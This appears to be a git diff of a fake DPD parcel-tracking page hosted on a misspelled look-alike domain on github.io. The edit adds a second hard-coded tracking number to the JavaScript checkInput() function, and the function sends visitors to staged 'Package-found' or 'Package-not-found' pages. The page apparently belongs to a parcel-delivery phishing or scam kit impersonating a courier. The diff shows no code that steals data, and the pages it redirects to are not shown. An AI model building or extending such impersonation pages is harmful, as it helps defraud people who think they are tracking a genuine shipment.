@@ -61,25 +61,28 @@
    					      <button class="btn btn-search" onclick="checkInput()" style="background-color: #d80032; color: #ffffff; position: absolute; top: 0; right: 0; bottom: 0;">Track</button>
 					  </div>
 
-                                <div class="search-reference-link">
-                                    <a href="https://dpdexpressgrece.github.io/Arrow/" target="_blank" style="color:#ffffff">
-                                        For tracking multiple shipments <i class="fa fa-chevron-right" style="color:#ffffff"></i>
-                                    </a>
-                                </div>
-                            </div>
-                            <script>
-                                function checkInput() {
-                                    var input = document.getElementById("seek-649ed0711a595");
-                                    var inputValue = input.value.trim();
+				 <div class="search-reference-link">
+      				     <a href="https://dpdexpressgrece.github.io/Arrow/" target="_blank" style="color:#ffffff">
+      				         For tracking multiple shipments <i class="fa fa-chevron-right" style="color:#ffffff"></i>
+   				     </a>
+				 </div>
+			     </div>
+		             <script>
+                                 function checkInput() {
+       				 var input = document.getElementById("seek-649ed0711a595");
+       				 var inputValue = input.value.trim();
 
-                                    if (inputValue === "3456 7898 7667 88") {
-                                        window.location.href = "https://dpdexpressgrece.github.io/Package-found/index.html";
-                                    } else {
-                                        window.location.href = "https://dpdexpressgrece.github.io/Package-not-found/index.html";
-                                    }
-                                }
-                            </script>
-                        </div>
+        // Ajouter une condition pour vérifier le numéro "3456 7898 7667 88" ou "3456 7898 7628 89"
+        		         if (inputValue === "3456 7898 7667 88") {
+          			     window.location.href = "https://dpdexpressgrece.github.io/Package-found/index.html";
+      			         } else if (inputValue === "3456 7898 7628 89") {
+           			     window.location.href = "https://dpdexpressgrece.github.io/Package-found-in/index.html";
+      			         } else {
+          			     window.location.href = "https://dpdexpressgrece.github.io/Package-not-found/index.html";
+      				 }
+  			     }
+			 </script>
+		     </div>
 <div id="menu"> <ul><li><a href="javascript:;">
 Services
 </a><ul class="dropdown"><li><a href="/en/classic-service" target="_self">
